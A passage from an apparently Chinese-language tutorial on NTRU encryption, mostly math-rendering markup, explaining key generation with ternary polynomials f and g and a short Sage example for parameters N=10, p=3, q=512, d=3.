transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mi" transform="translate(2900,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/></g><g data-mml-node="mo" transform="translate(3377,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(3766,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(4338,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span> ，他们的系数为{-1, 0, 1}。</p><p><strong>例，N = 10, p = 3, q = 512, d = 3时(N, p, q, d) = (10, 3, 512, 3):</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;x&gt; = ZZ[]</span><br><span class="line">def T(d1, d2):</span><br><span class="line">    assert N &gt;= d1+d2</span><br><span class="line">    s = [1]*d1 + [-1]*d2 + [0]*(N-d1-d2)</span><br><span class="line">    shuffle(s)</span><br><span class="line">    return R(s)</span><br><span class="line">    </span><br><span class="line">f = T(d+1, d)</span><br><span class="line">g = T(d, d)</span><br><span class="line"></span><br><span class="line">print("f = ", f)</span><br><span class="line"># f =  x^7 + x^6 + x^5 + x^4 - x^2 - x - 1</span><br><span class="line">print("g = ", g)</span><br><span class="line"># g =  -x^9 + x^5 + x^4 - x^2 - x + 1</span><br></pre></td></tr></table></figure><p><span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.244ex" height="2.059ex" role="img" focusable="false" viewbox="0 -705 550 910"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g></g></g></svg></mjx-container></span>和<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="1.079ex" height="1.464ex" role="img" focusable="false" viewbox="0 -442 477 647"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"/></g></g></g></svg></mjx-container></span>可以看作是模多项式<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="6.799ex" height="2.099ex" role="img" focusable="false" viewbox="0 -846 3005.4 928"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mi" transform="translate(605,363) scale(0.707)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"/></g></g><g data-mml-node="mo" transform="translate(1505.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"/></g><g data-mml-node="mn" transform="translate(2505.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></svg></mjx-container></span>的剩余类的表示。同时，系数在mod p情况下，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="5.155ex" height="2.347ex" role="img" focusable="false" viewbox="0 -750 2278.7 1037.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g></g><g data-mml-node="mo" transform="translate(928.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(1317.7,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(1889.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span>满足<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="15.237ex" height="2.347ex" role="img" focusable="false" viewbox="0 -750 6734.7 1037.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(2122.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="msub" transform="translate(2622.4,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/></g></g><g data-mml-node="mo" transform="translate(3551.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(3940.1,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(4512.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(5178.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(6234.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></svg></mjx-container></span>;系数在模mod q情况下，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.339ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2360 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(550,0)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g><g data-mml-node="mo" transform="translate(1010,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(1399,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(1971,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></span>满足<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="12.114ex" height="2.347ex" role="img" focusable="false" viewbox="0 -750 5354.3 1037.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mo" transform="translate(772.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"/></g><g data-mml-node="msub" transform="translate(1272.4,0)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"/></g><g data-mml-node="mi" transform="translate(523,-150) scale(0.707)"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"/></g></g><g data-mml-node="mo" transform="translate(2170.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mi" transform="translate(2559.7,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"/></g><g data-mml-node="mo" transform="translate(3131.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(3798.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mn" transform="translate(4854.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g></g></g></svg></mjx-container></span>。</p><p>公钥h满足：<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="21.162ex" height="2.347ex" role="img" focusable="false" viewbox="0 -750 9353.7 1037.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/></g><g data-mml-node="mo" transform="translate(853.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/></g><g data-mml-node="mi" transform="translate(1909.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 